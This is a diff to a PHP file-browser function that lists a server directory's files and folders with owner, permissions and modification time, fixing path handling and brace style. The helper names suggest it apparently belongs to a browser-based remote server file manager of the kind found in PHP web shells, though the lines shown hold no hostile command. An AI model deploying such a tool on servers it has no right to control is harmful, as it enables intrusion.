@@ -657,7 +657,6 @@ if(!function_exists('get_drives')){
 if(!function_exists('show_all_files')){
 	function show_all_files($path){
 		if(!is_dir($path)) return "No such directory : ".$path;
-		chdir($path);
 		$output = "";
 		$allfiles = $allfolders = array();
 		if($res = opendir($path)){
@@ -669,23 +668,21 @@ if(!function_exists('show_all_files')){
 			}
 		}
 
-		array_unshift($allfolders, ".");
-		$cur = getcwd();
-		chdir("..");
-		if(getcwd()!=$cur) array_unshift($allfolders, "..");
-		chdir($cur);
+        array_unshift($allfolders, ".");
+        $cur = getcwd();
+        chdir("..");
+        if(getcwd()!=$cur) array_unshift($allfolders, "..");
+        chdir($cur);
 
 		natcasesort($allfolders);
 		natcasesort($allfiles);
 
-		$cols = array();
 		if(is_win()){
 			$cols = array(
 					"perms"=>"get_fileperms",
 					"modified"=>"get_filemtime"
 					);
-		}
-		else{
+		}else{
 			$cols = array(
 					"owner"=>"get_fileowner",
 					"perms"=>"get_fileperms",
@@ -709,13 +706,12 @@ if(!function_exists('show_all_files')){
 			if(($d==".")||($d=="..")){
 				$action = "actiondot";
 				$cboxException = " cBoxException";
-			}
-			else{
+			}else{
 				$action = "actionfolder";
 				$totalFolders++;
 			}
 			$output .= "
-	<tr data-path=\"".html_safe(realpath($d).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td>
+	<tr data-path=\"".html_safe(realpath($path.$d).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td>
 	<td style='white-space:normal;'>".file_icon()." <a class='navigate'>[ ".html_safe($d)." ]</a><span class='".$action." floatRight'>action</span></td>
 	<td>DIR</td>";
 			foreach($cols as $k=>$v){
